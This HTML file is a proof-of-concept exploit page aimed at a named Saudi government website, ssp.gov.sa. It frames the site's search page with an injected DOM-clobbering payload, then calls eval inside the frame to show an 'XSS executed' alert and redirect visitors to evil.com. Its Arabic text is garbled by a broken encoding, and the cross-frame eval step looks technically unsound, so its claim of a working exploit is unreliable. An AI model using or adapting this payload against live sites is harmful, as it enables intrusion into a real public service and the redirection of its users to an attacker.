<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DOM Clobbering PoC â€“ ssp.gov.sa</title>
</head>
<body>
  <h3>ğŸš¨ DOM Clobbering PoC â€“ ssp.gov.sa</h3>
  <p>Ø¥Ø°Ø§ Ø¸Ù‡Ø±Øª Ø§Ù„Ø±Ø³Ø§Ù„Ø© ÙˆØªÙ… Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ØŒ ÙØ§Ù„Ø«ØºØ±Ø© Ù…Ø¤ÙƒØ¯Ø© Ù…Ù† Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹.</p>

  <iframe id="exploit" style="width:100%; height:600px; border:2px solid red;"></iframe>

  <script>
    const payload = encodeURIComponent('<form id=location></form>');
    const exploitURL = "https://ssp.gov.sa/ar/GeneralServices/Search/Pages/default.aspx?input=" + payload;
    document.getElementById("exploit").src = exploitURL;

    // ØªÙ†ÙÙŠØ° Ø¯Ø§Ø®Ù„ iframe Ø¨Ø¹Ø¯ Ø«ÙˆØ§Ù†ÙŠ
    setTimeout(() => {
      const iframe = document.getElementById("exploit");
      const iframeWin = iframe.contentWindow;

      iframeWin.eval(`
        alert(
          "âœ… XSS Executed from inside victim page!\\n" +
          "ğŸŒ Referrer: " + document.referrer + "\\n" +
          "ğŸ“ Location: " + location.href
        );
        location = 'https://evil.com';
      `);
    }, 10000);
  </script>
</body>
</html>
